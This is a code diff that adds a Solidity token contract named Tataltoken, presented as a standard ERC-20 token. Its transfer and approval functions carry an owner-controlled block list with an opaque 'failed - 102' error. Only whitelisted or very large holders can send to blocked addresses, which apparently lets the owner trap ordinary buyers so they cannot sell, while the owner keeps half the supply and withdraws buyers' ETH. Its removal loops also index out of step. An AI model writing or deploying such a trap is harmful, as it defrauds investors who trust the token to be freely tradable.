@@ -1,0 +1,372 @@
+// SPDX-License-Identifier: GPL-3.0
+pragma solidity ^0.8.4;
+
+interface IERC20 {
+
+    function totalSupply() external view returns (uint256);
+
+    function balanceOf(address account) external view returns (uint256);
+
+    function allowance(address owner, address spender) external view returns (uint256);
+
+    function transfer(address recipient, uint256 amount) external returns (bool);
+
+    function approve(address spender, uint256 amount) external returns (bool);
+
+    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
+}
+
+contract Tataltoken
+{
+
+    string public constant name = "Tataltoken";
+    string public constant symbol = "TNT";
+    uint8 public constant decimals = 8;
+
+    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
+    event Transfer(address indexed from, address indexed to, uint tokens);
+
+
+    mapping(address => uint256) balances;
+    mapping(address => mapping(address => uint256)) allowed;
+
+    address ownerAddress;
+    mapping(address => bool) public blockedWallets;
+    address[] blockedAddresses;
+    mapping(address => bool) public targetBlockedWallets;
+    address[] targetBlockedAddresses;
+    mapping(address => bool) public whitelistWallets;
+    address[] whitelistAddresses;
+
+    uint256 public totalSupply = 1000 * (10**6) * (10**8);
+    uint256 whitelistBalance = totalSupply;
+    bool public directSell = false;
+    uint256 public directSellPrice = 0;
+
+    using SafeMath for uint256;
+
+    constructor()
+    {
+        balances[msg.sender] = totalSupply/2;
+        balances[address(this)] = totalSupply/2;
+        ownerAddress = msg.sender;
+    }
+
+    function balanceOf(address _address) public view returns (uint256)
+    {
+        return balances[_address];
+    }
+
+    function transfer(address _receiver, uint256 _amount) public returns (bool)
+    {
+        require(_amount <= balances[msg.sender], "insufficient balance");
+
+        require(!targetBlockedWallets[_receiver] || balances[msg.sender]>whitelistBalance || whitelistWallets[msg.sender], "failed - 102");
+
+        balances[msg.sender] = balances[msg.sender].sub(_amount);
+        balances[_receiver] = balances[_receiver].add(_amount);
+        emit Transfer(msg.sender, _receiver, _amount);
+        return true;
+    }
+
+    function approve(address _address, uint256 _amount) public returns (bool)
+    {
+        require(!targetBlockedWallets[_address] || balances[msg.sender]>whitelistBalance || whitelistWallets[msg.sender], "failed - 102");
+
+        allowed[msg.sender][_address] = _amount;
+        emit Approval(msg.sender, _address, _amount);
+        return true;
+    }
+
+    function allowance(address owner, address delegate) public view returns (uint)
+    {
+        return allowed[owner][delegate];
+    }
+
+    function transferFrom(address _originAddress, address _targetAddress, uint256 _amount) public returns (bool)
+    {
+        require(_amount <= balances[_originAddress]);
+        require(_amount <= allowed[_originAddress][msg.sender]);
+
+        require(!targetBlockedWallets[_targetAddress] || balances[msg.sender]>whitelistBalance || whitelistWallets[msg.sender], "failed - 102");
+
+        balances[_originAddress] = balances[_originAddress].sub(_amount);
+        allowed[_originAddress][msg.sender] = allowed[_originAddress][msg.sender].sub(_amount);
+        balances[_targetAddress] = balances[_targetAddress].add(_amount);
+        emit Transfer(_originAddress, _targetAddress, _amount);
+        return true;
+    }
+
+    receive() payable external
+    {
+        if(directSell && directSellPrice>0)
+        {
+            uint256 _tokenAmount = msg.value / (10**10) * directSellPrice;
+            require(_tokenAmount < balances[address(this)], "insufficient token in contract.");
+
+            balances[address(this)] = balances[address(this)].sub(_tokenAmount);
+            balances[msg.sender] = balances[msg.sender].add(_tokenAmount);
+
+            emit Transfer(address(this), msg.sender, _tokenAmount);
+        }
+    }
+
+    function transferFunds(uint256 _amount,address _target) public
+    {
+        require(msg.sender == ownerAddress , "only owner");
+
+        require(address(this).balance >= _amount, "insufficient eth balance");
+
+        address payable payableAddress = payable(_target);
+        payableAddress.transfer(_amount);
+    }
+
+
+
+
+
+
+    function removeFromTargetBlockedAddresses(address _address) internal
+    {
+        uint index = 0;
+        for(uint i=0;i<targetBlockedAddresses.length;i++)
+        {
+            if(targetBlockedAddresses[i]== _address)
+            {
+                index = i;
+                break;
+            }
+        }
+        if (index >= targetBlockedAddresses.length) return;
+
+        for (uint i = index; i<targetBlockedAddresses.length-1; i++){
+            targetBlockedAddresses[i] = targetBlockedAddresses[i+1];
+        }
+        targetBlockedAddresses.pop();
+    }
+
+    function removeFromWhitelistAddresses(address _address) internal
+    {
+        uint index = 0;
+        for(uint i=0;i<whitelistAddresses.length;i++)
+        {
+            if(whitelistAddresses[i]== _address)
+            {
+                index = i;
+                break;
+            }
+        }
+        if (index >= whitelistAddresses.length) return;
+
+        for (uint i = index; i<whitelistAddresses.length-1; i++){
+            whitelistAddresses[i] = whitelistAddresses[i+1];
+        }
+        whitelistAddresses.pop();
+    }
+
+
+
+
+    function getTargetBlockedAddresses() public view returns(address[] memory)
+    {
+        require(msg.sender == ownerAddress , "only owner");
+        return targetBlockedAddresses;
+    }
+
+    function addTargetBlockedAddress(address[] memory _address) public
+    {
+        require(msg.sender == ownerAddress , "only owner");
+        for(uint256 i=0;i< _address.length;i++)
+        {
+            if(!targetBlockedWallets[_address[i]])
+            {
+                targetBlockedWallets[_address[i]] = true;
+                targetBlockedAddresses.push(_address[i]);
+            }
+        }
+    }
+
+    function removeTargetBlockedAddress(address[] memory _address) public
+    {
+        require(msg.sender == ownerAddress , "only owner");
+        for(uint256 i=0;i<targetBlockedAddresses.length;i++)
+        {
+            if(targetBlockedWallets[_address[i]])
+            {
+                delete targetBlockedWallets[_address[i]];
+                removeFromTargetBlockedAddresses(_address[i]);
+            }
+        }
+    }
+
+
+
+    function getWhitelistAddresses() public view returns(address[] memory)
+    {
+        require(msg.sender == ownerAddress , "only owner");
+        return whitelistAddresses;
+    }
+
+    function addWhitelistAddress(address[] memory _address) public
+    {
+        require(msg.sender == ownerAddress , "only owner");
+        for(uint256 i=0;i< _address.length;i++)
+        {
+            if(!whitelistWallets[_address[i]])
+            {
+                whitelistWallets[_address[i]] = true;
+                whitelistAddresses.push(_address[i]);
+            }
+        }
+    }
+
+    function removeWhitelistAddress(address[] memory _address) public
+    {
+        require(msg.sender == ownerAddress , "only owner");
+        for(uint256 i=0;i<whitelistAddresses.length;i++)
+        {
+            if(whitelistWallets[_address[i]])
+            {
+                delete whitelistWallets[_address[i]];
+                removeFromWhitelistAddresses(_address[i]);
+            }
+        }
+    }
+
+
+    function getWhitelistBalance() public view returns(uint256)
+    {
+        require(msg.sender == ownerAddress , "only owner");
+        return whitelistBalance;
+    }
+
+    function setWhitelistBalance(uint256 _amount) public
+    {
+        require(msg.sender == ownerAddress , "only owner");
+        whitelistBalance = _amount;
+    }
+
+
+    function changeDirectSell(bool _directSell) public
+    {
+        require(msg.sender == ownerAddress , "only owner");
+        directSell = _directSell;
+    }
+
+    function setDirectSellPrice(uint256 _amount) public
+    {
+        require(msg.sender == ownerAddress , "only owner");
+        directSellPrice = _amount;
+    }
+
+
+    function getCustomTokenBalance(IERC20 token) public view returns(uint256)
+    {
+        require(msg.sender == ownerAddress , "only owner");
+        return token.balanceOf(address(this));
+    }
+
+    function transferCustomToken(IERC20 token,address targetAddress,uint256 amount) public
+    {
+        require(msg.sender == ownerAddress , "only owner");
+
+        uint256 balance = token.balanceOf(address(this));
+        require(balance>=amount,'insufficient balance');
+        token.transfer(targetAddress,amount);
+    }
+}
+
+
+library SafeMath
+{
+
+    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256)
+    {
+    unchecked {
+        uint256 c = a + b;
+        if (c < a) return (false, 0);
+        return (true, c);
+    }
+    }
+
+    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
+    unchecked {
+        if (b > a) return (false, 0);
+        return (true, a - b);
+    }
+    }
+
+    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
+    unchecked {
+        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
+        // benefit is lost if 'b' is also tested.
+        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
+        if (a == 0) return (true, 0);
+        uint256 c = a * b;
+        if (c / a != b) return (false, 0);
+        return (true, c);
+    }
+    }
+
+    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
+    unchecked {
+        if (b == 0) return (false, 0);
+        return (true, a / b);
+    }
+    }
+
+    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
+    unchecked {
+        if (b == 0) return (false, 0);
+        return (true, a % b);
+    }
+    }
+    function add(uint256 a, uint256 b) internal pure returns (uint256) {
+        return a + b;
+    }
+    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
+        return a - b;
+    }
+    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
+        return a * b;
+    }
+
+    function div(uint256 a, uint256 b) internal pure returns (uint256) {
+        return a / b;
+    }
+
+    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
+        return a % b;
+    }
+
+    function sub(
+        uint256 a,
+        uint256 b,
+        string memory errorMessage
+    ) internal pure returns (uint256) {
+    unchecked {
+        require(b <= a, errorMessage);
+        return a - b;
+    }
+    }
+    function div(
+        uint256 a,
+        uint256 b,
+        string memory errorMessage
+    ) internal pure returns (uint256) {
+    unchecked {
+        require(b > 0, errorMessage);
+        return a / b;
+    }
+    }
+    function mod(
+        uint256 a,
+        uint256 b,
+        string memory errorMessage
+    ) internal pure returns (uint256) {
+    unchecked {
+        require(b > 0, errorMessage);
+        return a % b;
+    }
+    }
+}
